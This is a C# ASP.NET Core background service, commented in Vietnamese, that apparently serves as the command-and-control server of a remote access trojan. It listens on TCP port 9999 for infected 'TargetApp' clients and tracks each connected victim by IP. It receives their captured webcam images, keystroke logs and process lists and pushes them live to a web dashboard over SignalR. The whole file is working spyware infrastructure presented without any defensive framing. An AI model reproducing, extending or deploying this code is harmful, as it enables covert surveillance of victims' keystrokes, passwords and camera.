using Microsoft.AspNetCore.SignalR;
using Microsoft.Extensions.Hosting;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ControllerMVC.Hubs;

namespace ControllerMVC.Services
{
    public class TcpListenerService : BackgroundService
    {
        private TcpListener _listener;
        private readonly IHubContext<ControlHub> _hubContext;

        public TcpListenerService(IHubContext<ControlHub> hubContext)
        {
            _hubContext = hubContext;
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            try
            {
                // Lắng nghe trên mọi IP
                _listener = new TcpListener(IPAddress.Any, 9999);
                _listener.Start();

                // [DEBUG] Báo hiệu Server đã sẵn sàng
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("=============================================");
                Console.WriteLine("SERVER SOCKET DANG LANG NGHE TAI CONG 9999");
                Console.WriteLine("Hay bat TargetApp len de ket noi...");
                Console.WriteLine("=============================================");
                Console.ResetColor();

                while (!stoppingToken.IsCancellationRequested)
                {
                    // Chờ kết nối...
                    var client = await _listener.AcceptTcpClientAsync();

                    // [DEBUG] Báo hiệu ngay lập tức khi có kết nối chạm vào
                    var ip = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"[!!!] PHAT HIEN KET NOI MOI TU: {ip}");
                    Console.ResetColor();

                    // Lưu vào danh sách và xử lý
                    ControlHub.ActiveClients[ip] = client;

                    // Gửi tín hiệu lên Web
                    await _hubContext.Clients.All.SendAsync("ClientConnected", ip);
                    Console.WriteLine($"-> Da gui tin hieu 'ClientConnected' len Web.");

                    _ = Task.Run(() => HandleClient(client, ip, stoppingToken));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"LOI SERVER: {ex.Message}");
            }
        }

        private async Task HandleClient(TcpClient client, string ip, CancellationToken token)
        {
            try
            {
                var stream = client.GetStream();
                Console.WriteLine($"-> Bat dau doc du lieu tu {ip}...");

                while (client.Connected && !token.IsCancellationRequested)
                {
                    // 1. Đọc độ dài
                    byte[] lenBuffer = new byte[4];
                    int read = await stream.ReadAsync(lenBuffer, 0, 4, token);
                    if (read == 0)
                    {
                        Console.WriteLine($"[!] {ip} da ngat ket noi.");
                        break;
                    }

                    int packetLen = BitConverter.ToInt32(lenBuffer, 0);
                    // Console.WriteLine($"-> Nhan duoc goi tin kich thuoc: {packetLen} bytes");

                    // 2. Đọc nội dung
                    if (packetLen > 0)
                    {
                        byte[] data = new byte[packetLen];
                        int totalRead = 0;
                        while (totalRead < packetLen)
                        {
                            int r = await stream.ReadAsync(data, totalRead, packetLen - totalRead, token);
                            if (r == 0) break;
                            totalRead += r;
                        }

                        string msg = Encoding.UTF8.GetString(data);
                        // Console.WriteLine($"-> Noi dung: {msg.Substring(0, Math.Min(msg.Length, 50))}..."); // In tóm tắt

                        // Xử lý gửi lên Web
                        if (msg.StartsWith("IMG|"))
                            await _hubContext.Clients.All.SendAsync("ReceiveWebcam", msg.Substring(4));
                        else if (msg.StartsWith("KEYLOG:"))
                            await _hubContext.Clients.All.SendAsync("ReceiveLog", $"[KEYLOG]\n{msg.Substring(7)}");
                        else if (msg.StartsWith("PID:"))
                            await _hubContext.Clients.All.SendAsync("ReceiveLog", $"[APP]\n{msg.Substring(4)}");
                        else
                        {
                            Console.WriteLine($"-> GUI LEN WEB: {msg}");
                            await _hubContext.Clients.All.SendAsync("ReceiveLog", $"[{ip}] {msg}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"LOI KHI DOC: {ex.Message}");
            }
            ControlHub.ActiveClients.TryRemove(ip, out _);
        }
    }
}